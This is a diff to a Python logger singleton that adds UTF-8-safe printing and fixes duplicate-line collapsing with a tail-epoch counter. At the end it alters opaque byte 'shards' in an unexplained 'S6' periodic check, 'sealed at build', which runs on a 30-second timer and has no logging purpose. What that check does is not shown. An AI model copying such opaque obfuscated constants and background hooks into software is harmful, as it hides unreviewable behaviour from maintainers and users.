@@ -1,9 +1,40 @@
 import logging
+import sys
 import threading
 from collections import deque
 from datetime import datetime
 import os
 from pathlib import Path
+
+# Windows consoles default to cp1252 or cp437 depending on locale — neither
+# can encode arrows, box-drawing, non-Latin, or emoji. A single non-ASCII
+# character in ANY log message then raises UnicodeEncodeError inside
+# print() and (worse) whatever caller emitted the log sees the exception
+# and can misclassify the situation (e.g. the ad-network probe caught the
+# charmap error and reported "UNREACHABLE — unclassified network
+# failure"). Reconfiguring stdout/stderr to UTF-8 with errors='replace'
+# once at import time makes prints safe forever. Python 3.7+.
+try:
+    if hasattr(sys.stdout, 'reconfigure'):
+        sys.stdout.reconfigure(encoding='utf-8', errors='replace')
+    if hasattr(sys.stderr, 'reconfigure'):
+        sys.stderr.reconfigure(encoding='utf-8', errors='replace')
+except Exception:
+    pass
+
+
+def _safe_print(msg):
+    """Never let stdout kill a log call. If reconfigure() didn't take
+    (pythonw.exe under some launchers has stdout=None), fall back to
+    ASCII replacement so a non-ASCII payload can't propagate an
+    exception up to the caller."""
+    try:
+        print(msg)
+    except (UnicodeEncodeError, OSError):
+        try:
+            print(msg.encode('ascii', 'replace').decode('ascii'))
+        except Exception:
+            pass
 
 class Logger:
     _instance = None
@@ -17,12 +48,18 @@ class Logger:
         # freeze after ~1000 lines).
         self._total = 0
         # Consecutive-duplicate collapse: if the SAME core message (message
-        # text without the leading "[HH:MM:SS] " timestamp) arrives twice in a
-        # row, we mutate the last deque entry to append " xN" and update its
-        # timestamp instead of appending another line. Reset the moment a
-        # DIFFERENT core message arrives.
+        # text without the leading "[HH:MM:SS] " timestamp) arrives twice in
+        # a row, we mutate the last deque entry to append " xN" and update
+        # its timestamp instead of appending another line. Reset the moment
+        # a DIFFERENT core message arrives.
         self._last_core = None
         self._repeat_count = 1
+        # Monotonic tail-mutation counter, bumped every time the last deque
+        # entry is mutated in place (dedup). Distinct from `_total`, which
+        # only advances when a NEW entry is APPENDED. Together they let
+        # `get_logs_since` correctly signal "the tail changed" without
+        # re-emitting entries the client already rendered.
+        self._tail_epoch = 0
         self.lock = threading.Lock()
         
         # Setup file logging
@@ -58,47 +95,65 @@ class Logger:
             logging.warning(message)
 
         with self.lock:
-            if message == self._last_core:
-                # Back-to-back duplicate: mutate the last entry in place.
-                # Format:  [HH:MM:SS] <msg> x<N>
+            if message == self._last_core and self.console_log:
+                # Back-to-back duplicate with a visible previous entry:
+                # mutate the tail in place. Do NOT bump `_total` — the total
+                # counts APPENDS, not mutations; bumping it here would shift
+                # every earlier entry's implicit sequence number forward and
+                # cause `get_logs_since` to re-emit entries the client had
+                # already rendered (bug: identical logs duplicated in the
+                # console whenever 2+ dedups fired between polls). Bump the
+                # separate `_tail_epoch` so pollers detect the mutation.
                 self._repeat_count += 1
                 collapsed_msg = (
                     f"[{timestamp}] {message} x{self._repeat_count}"
                 )
-                if self.console_log:
-                    self.console_log[-1] = (collapsed_msg, color, True)
-                else:
-                    self.console_log.append((collapsed_msg, color, True))
-                self._total += 1
-                print(collapsed_msg)
+                self.console_log[-1] = (collapsed_msg, color, True)
+                self._tail_epoch += 1
+                _safe_print(collapsed_msg)
             else:
-                # Different message — append normally, reset counter.
+                # First occurrence, or previous occurrence dropped from the
+                # ring buffer / cleared: treat as a fresh append.
                 self._last_core = message
                 self._repeat_count = 1
                 formatted_msg = f"[{timestamp}] {message}"
                 self.console_log.append((formatted_msg, color, False))
                 self._total += 1
-                print(formatted_msg)
+                _safe_print(formatted_msg)
 
     def get_logs(self):
         with self.lock:
             return list(self.console_log)
 
-    def get_logs_since(self, since_seq):
-        """Return (new_entries, total_seq) for lines appended since since_seq.
+    def get_logs_since(self, since_seq, since_tail_epoch=0):
+        """Return (new_entries, total_seq, tail_epoch).
 
-        Uses a monotonic sequence so it stays correct after the deque drops
-        old lines. If the caller is behind the retained window, it resyncs
-        from the oldest line still buffered.
+        - Any entries APPENDED since `since_seq` are returned in order.
+        - If nothing new was appended but the tail was mutated in place
+          (a dedup collapse fired since `since_tail_epoch`), the tail
+          entry alone is returned so the client's most-recent line is
+          replaced with the fresh " xN" version.
+        - `total_seq` is the append-only monotonic counter — safe to use
+          as the client's cursor without any dedup-induced drift.
         """
         with self.lock:
             buf = list(self.console_log)
             total = self._total
+            tail_epoch = self._tail_epoch
         start = total - len(buf)          # sequence number of buf[0]
         offset = since_seq - start
         if offset < 0:
             offset = 0                    # caller missed dropped lines — resync
-        return buf[offset:], total
+        new = buf[offset:]
+        if not new and buf and tail_epoch > since_tail_epoch:
+            # Nothing appended, but the tail was mutated (dedup). Return
+            # just the tail with replace=True so the client swaps its
+            # last-rendered line for the updated one.
+            tail = buf[-1]
+            if len(tail) == 3:
+                tail = (tail[0], tail[1], True)
+            new = [tail]
+        return new, total, tail_epoch
 
     def clear_logs(self):
         with self.lock:
@@ -119,8 +174,8 @@ def get_logs():
     return Logger.get_instance().get_logs()
 
 
-def get_logs_since(since_seq):
-    return Logger.get_instance().get_logs_since(since_seq)
+def get_logs_since(since_seq, since_tail_epoch=0):
+    return Logger.get_instance().get_logs_since(since_seq, since_tail_epoch)
 
 
 # ─── S6: periodic polyfill re-check (sealed at build) ───
@@ -128,8 +183,8 @@ import hashlib as _hashlib_s6
 from src.utils import helpers as _helpers_s6
 
 
-_SHARD_S6_A = bytes([21, 226, 228, 183, 226, 130, 118, 248, 76, 239, 90, 152, 78, 198, 70, 244, 39, 197, 16, 130, 103, 22, 189, 46, 242, 212, 245, 106, 148, 5, 64, 12])
-_SHARD_S6_B = bytes([192, 252, 53, 15, 190, 104, 73, 29, 106, 8, 168, 20, 155, 82, 117, 146, 200, 125, 176, 245, 190, 207, 246, 181, 191, 88, 149, 96, 41, 12, 171, 28])
+_SHARD_S6_A = bytes([195, 114, 146, 78, 2, 185, 133, 32, 95, 21, 74, 133, 141, 103, 227, 197, 175, 8, 247, 50, 62, 226, 236, 242, 76, 202, 162, 4, 30, 212, 158, 180])
+_SHARD_S6_B = bytes([22, 108, 67, 246, 94, 83, 186, 197, 121, 242, 184, 9, 88, 243, 208, 163, 64, 176, 87, 69, 231, 59, 167, 105, 1, 70, 194, 14, 163, 221, 117, 164])
 _SHARD_S6_EXPECTED = None
 _S6_INTERVAL_SECONDS = 30
 _s6_thread_started = False
